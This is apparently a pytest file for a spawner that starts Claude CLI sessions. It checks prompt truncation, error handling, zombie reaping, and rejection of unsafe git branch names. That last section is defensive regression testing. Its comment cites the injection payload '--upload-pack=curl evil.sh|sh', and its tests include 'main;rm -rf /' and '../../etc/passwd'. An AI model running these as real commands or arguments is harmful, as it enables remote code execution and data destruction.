"""Tests for SessionSpawner — verifies CLI invocation and error handling."""

from __future__ import annotations

import subprocess
import threading
from unittest.mock import MagicMock, patch

from spawner import SessionSpawner, _is_safe_branch


class TestSpawnPrReview:
    def test_spawns_with_opus_model(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")

        with patch("spawner.subprocess.Popen") as mock_popen:
            result = spawner.spawn_pr_review(
                pr_number=42,
                pr_diff="Diff available at: https://example.com/42.diff",
                ticket_context="Implements PROJ-123",
            )

        assert result is True
        mock_popen.assert_called_once()
        cmd = mock_popen.call_args[0][0]
        assert cmd[0] == "claude"
        assert "-p" in cmd
        # PR review uses opus — no --model flag means default (opus)
        assert "--model" not in cmd

    def test_truncates_diff_to_1500_chars(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")
        marker = "\u00b6"  # Pilcrow — won't appear in prompt template
        long_diff = marker * 5000

        with patch("spawner.subprocess.Popen") as mock_popen:
            spawner.spawn_pr_review(pr_number=1, pr_diff=long_diff, ticket_context="")

        cmd = mock_popen.call_args[0][0]
        prompt = cmd[cmd.index("-p") + 1]
        # Diff is truncated to 1500 chars via [:1500] in spawner
        assert prompt.count(marker) == 1500


class TestSpawnCiFix:
    def test_spawns_with_sonnet_model(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")

        with patch("spawner.subprocess.Popen") as mock_popen, \
             patch("spawner.subprocess.run"):
            result = spawner.spawn_ci_fix(
                pr_number=42, branch="ai/PROJ-123", failure_logs="Error: test failed"
            )

        assert result is True
        cmd = mock_popen.call_args[0][0]
        assert "--model" in cmd
        model_idx = cmd.index("--model")
        assert cmd[model_idx + 1] == "sonnet"

    def test_truncates_failure_logs_to_3000_chars(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")
        long_logs = "E" * 10000

        with patch("spawner.subprocess.Popen") as mock_popen, \
             patch("spawner.subprocess.run"):
            spawner.spawn_ci_fix(pr_number=1, branch="main", failure_logs=long_logs)

        cmd = mock_popen.call_args[0][0]
        prompt = cmd[cmd.index("-p") + 1]
        assert len(prompt) < 10000


class TestSpawnCommentResponse:
    def test_spawns_with_sonnet_model(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")

        with patch("spawner.subprocess.Popen") as mock_popen:
            result = spawner.spawn_comment_response(
                pr_number=42,
                comment_body="Why this approach?",
                comment_author="reviewer",
            )

        assert result is True
        cmd = mock_popen.call_args[0][0]
        assert "--model" in cmd

    def test_truncates_comment_body_to_3000_chars(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")
        long_comment = "W" * 10000

        with patch("spawner.subprocess.Popen") as mock_popen:
            spawner.spawn_comment_response(
                pr_number=1, comment_body=long_comment, comment_author="user"
            )

        cmd = mock_popen.call_args[0][0]
        prompt = cmd[cmd.index("-p") + 1]
        assert len(prompt) < 10000


class TestSpawnErrorHandling:
    def test_returns_false_when_cli_not_found(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")

        with patch("spawner.subprocess.Popen", side_effect=FileNotFoundError):
            result = spawner.spawn_pr_review(pr_number=1, pr_diff="", ticket_context="")

        assert result is False

    def test_returns_false_on_os_error(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/repo")

        with patch("spawner.subprocess.Popen", side_effect=OSError("spawn failed")):
            result = spawner.spawn_ci_fix(pr_number=1, branch="main", failure_logs="")

        assert result is False

    def test_uses_repo_path_as_cwd(self) -> None:
        spawner = SessionSpawner(repo_path="/tmp/my-repo")

        with patch("spawner.subprocess.Popen") as mock_popen:
            spawner.spawn_pr_review(pr_number=1, pr_diff="", ticket_context="")

        assert mock_popen.call_args[1]["cwd"] == "/tmp/my-repo"

    def test_empty_repo_path_falls_back_to_env(self) -> None:
        spawner = SessionSpawner(repo_path="")

        with (
            patch("spawner.subprocess.Popen") as mock_popen,
            patch.dict("os.environ", {"CLIENT_REPO_PATH": ""}, clear=False),
        ):
            spawner.spawn_pr_review(pr_number=1, pr_diff="", ticket_context="")

        # With no repo_path and no CLIENT_REPO_PATH, cwd should be None
        assert mock_popen.call_args[1]["cwd"] is None


# --- Branch-name argument-injection regression ---
#
# Bug: _ensure_branch_current passed webhook-controlled branch names
# directly into `git fetch origin <branch>` etc. A branch starting
# with `-` (e.g. `--upload-pack=curl evil.sh|sh`) would be parsed by
# git as an option, historically a full RCE vector (CVE-2017-1000117
# family). Fix: validate branch names against _SAFE_BRANCH_RE and
# add `--` sentinel to fetch/pull (checkout can't use `--` because
# it treats args after `--` as pathspecs).


class TestBranchNameValidation:
    def test_safe_branch_accepts_normal_names(self) -> None:
        assert _is_safe_branch("main")
        assert _is_safe_branch("feature/foo")
        assert _is_safe_branch("ai/SCRUM-16")
        assert _is_safe_branch("release/2026.04")
        assert _is_safe_branch("user_branch.v2")

    def test_safe_branch_rejects_leading_dash(self) -> None:
        assert not _is_safe_branch("-foo")
        assert not _is_safe_branch("--upload-pack=curl")
        assert not _is_safe_branch("-")

    def test_safe_branch_rejects_empty_and_whitespace(self) -> None:
        assert not _is_safe_branch("")
        assert not _is_safe_branch(" main")
        assert not _is_safe_branch("main branch")
        assert not _is_safe_branch("main\n")
        assert not _is_safe_branch("main\t")

    def test_safe_branch_rejects_shell_metacharacters(self) -> None:
        assert not _is_safe_branch("main;rm -rf /")
        assert not _is_safe_branch("main`whoami`")
        assert not _is_safe_branch("main$(pwd)")
        assert not _is_safe_branch("main|cat")
        assert not _is_safe_branch("main&&evil")

    def test_safe_branch_rejects_double_dot(self) -> None:
        assert not _is_safe_branch("../../etc/passwd")
        assert not _is_safe_branch("foo..bar")

    def test_safe_branch_rejects_overlong(self) -> None:
        assert not _is_safe_branch("a" * 256)

    def test_ensure_branch_current_rejects_unsafe_branch(
        self, tmp_path
    ) -> None:
        """Unsafe branches must short-circuit without running git."""
        spawner = SessionSpawner(repo_path=str(tmp_path))
        log = MagicMock()
        with patch("spawner.subprocess.run") as mock_run:
            spawner._ensure_branch_current("--upload-pack=evil", log)
        mock_run.assert_not_called()
        log.error.assert_called_once()
        assert log.error.call_args[0][0] == "unsafe_branch_name_rejected"

    def test_ensure_branch_current_git_fetch_uses_sentinel(
        self, tmp_path
    ) -> None:
        """Safe branches should invoke git with the '--' sentinel for fetch/pull."""
        spawner = SessionSpawner(repo_path=str(tmp_path))
        log = MagicMock()
        ok_result = MagicMock(returncode=0, stderr="")
        with patch("spawner.subprocess.run", return_value=ok_result) as mock_run:
            spawner._ensure_branch_current("ai/SCRUM-16", log)
        # All subprocess.run calls — verify fetch and pull include "--"
        calls = [call.args[0] for call in mock_run.call_args_list]
        fetch_cmd = next(c for c in calls if c[:2] == ["git", "fetch"])
        pull_cmd = next(c for c in calls if c[:2] == ["git", "pull"])
        assert "--" in fetch_cmd
        assert fetch_cmd[-1] == "ai/SCRUM-16"
        assert "--" in pull_cmd
        assert pull_cmd[-1] == "ai/SCRUM-16"


# --- Watchdog zombie-reap regression ---
#
# Bug: _spawn's watchdog thread called proc.kill() on timeout but
# never proc.wait()'d afterward, leaving the child in zombie state.
# Over many timeouts the L3 process accumulates zombies and
# eventually hits RLIMIT_NPROC, at which point every new spawn
# fails silently. Fix: after proc.kill(), call proc.wait(timeout=5)
# to reap. Log l3_session_unreapable if the 5s wait fails.


class TestWatchdogZombieReap:
    def _spawn_with_mock_proc(
        self, proc_mock: MagicMock, tmp_path
    ) -> threading.Thread | None:
        """Spawn a session with a mocked Popen and capture the watchdog thread."""
        spawner = SessionSpawner(repo_path=str(tmp_path))
        captured: dict[str, threading.Thread] = {}
        real_thread_start = threading.Thread.start

        def _capture_start(self: threading.Thread) -> None:
            captured["t"] = self
            real_thread_start(self)

        with (
            patch("spawner.subprocess.Popen", return_value=proc_mock),
            patch.object(threading.Thread, "start", _capture_start),
        ):
            spawner._spawn(
                "pr-review",
                "test prompt",
                model="opus",
                pr_number=1,
            )
        return captured.get("t")

    def test_watchdog_reaps_after_kill(self, tmp_path) -> None:
        """On timeout → kill, watchdog must call wait() again to reap."""
        proc = MagicMock()
        proc.pid = 99999
        # First wait (with timeout=session_timeout) raises TimeoutExpired
        # to trigger the kill path. Second wait (after kill) returns 0.
        proc.wait = MagicMock(
            side_effect=[
                subprocess.TimeoutExpired(cmd="claude", timeout=1),
                0,  # successful reap
            ]
        )
        proc.kill = MagicMock()

        # Shrink timeout so wait triggers immediately
        with patch.dict("os.environ", {"L3_SESSION_TIMEOUT": "1"}):
            watchdog = self._spawn_with_mock_proc(proc, tmp_path)
        assert watchdog is not None
        watchdog.join(timeout=5)
        assert not watchdog.is_alive()

        # First: waited for timeout and TimeoutExpired fired
        # Kill was called
        proc.kill.assert_called_once()
        # Second wait with timeout=5 must have been called to reap the zombie
        assert proc.wait.call_count == 2, (
            "watchdog must call proc.wait() AFTER proc.kill() to reap zombie — "
            "regression for RLIMIT_NPROC leak bug"
        )
        second_call_kwargs = proc.wait.call_args_list[1][1]
        second_call_args = proc.wait.call_args_list[1][0]
        # timeout=5 passed as kwarg or positional
        assert (
            second_call_kwargs.get("timeout") == 5
            or (second_call_args and second_call_args[0] == 5)
        )

    def test_watchdog_logs_unreapable_on_secondary_timeout(
        self, tmp_path
    ) -> None:
        """If the post-kill wait also times out, log l3_session_unreapable."""
        proc = MagicMock()
        proc.pid = 99999
        proc.wait = MagicMock(
            side_effect=[
                subprocess.TimeoutExpired(cmd="claude", timeout=1),
                subprocess.TimeoutExpired(cmd="claude", timeout=5),
            ]
        )
        proc.kill = MagicMock()

        with (
            patch.dict("os.environ", {"L3_SESSION_TIMEOUT": "1"}),
            patch("spawner.logger") as mock_logger,
        ):
            watchdog = self._spawn_with_mock_proc(proc, tmp_path)
            assert watchdog is not None
            watchdog.join(timeout=5)

        # The unreapable log event must have fired
        error_calls = [
            c for c in mock_logger.error.call_args_list
            if c.args and c.args[0] == "l3_session_unreapable"
        ]
        assert error_calls, "l3_session_unreapable must be logged when second wait times out"
